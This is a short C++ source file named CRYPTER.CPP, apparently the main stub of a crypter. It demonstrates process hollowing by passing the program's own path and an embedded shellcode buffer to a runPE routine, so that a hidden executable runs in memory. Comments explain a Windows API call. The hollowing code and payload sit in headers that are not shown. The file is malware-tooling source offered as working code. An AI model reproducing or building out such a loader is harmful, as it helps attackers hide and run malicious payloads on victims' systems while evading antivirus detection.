//////////////////////////////////////////////////////////////////////////////////
// CRYPTER.CPP - Process Hollowing Example (Does no actual Encoding/Encryption)
//////////////////////////////////////////////////////////////////////////////////

#include <Windows.h>		// Include Windows API functions & macros
#include "runPE.h"		// Header file with runPE Class and run Function (to run shellcode.h in memory)
#include "shellcode.h"		// Contains the executable file to run in Memory as ShellCode (or ByteCode / Hexadecimal / 0x00)

int main()		// Entrypoint
{	
	runPE rp;	//Instantiate Object with name "rp" from runPE Class found in runPE.h
	
	TCHAR szFilePath[1024];		// Pointer to buffer that receives path to the module
					// FileName Buffer size in characters [1024]

/*	GetModuleFileNameEx function	-	Retrieves the fully qualified path for the file containing the specified module.
	
	DWORD WINAPI GetModuleFileNameEx(	_In_     HANDLE  hProcess,
						_In_opt_ HMODULE hModule,
						_Out_    LPTSTR  lpFilename,
						_In_     DWORD   nSize	);

	hProcess [in]			-	A handle to the process that contains the module.
						The handle must have the PROCESS_QUERY_INFORMATION and PROCESS_VM_READ access rights. 

	hModule [in, optional]		-	A handle to the module. If this parameter is NULL, 
						GetModuleFileNameEx returns the path of the executable file of the process specified in hProcess.
										
	lpFilename [out]		-	A pointer to a buffer that receives the fully qualified path to the module. 

	nSize [in]			-	The size of the lpFilename buffer, in characters.	*/

	GetModuleFileNameA (							// Retrieves the fully qualified path for the file containing the specified module.
						0,				// A handle to the process that contains the module.
						LPSTR ( szFilePath ),		// Filename
						1024				// Size
						);

	rp.run(LPSTR (szFilePath), shellcode);		// void runPE::run(LPSTR szFilePath, PVOID pFile)

	return 0;
}
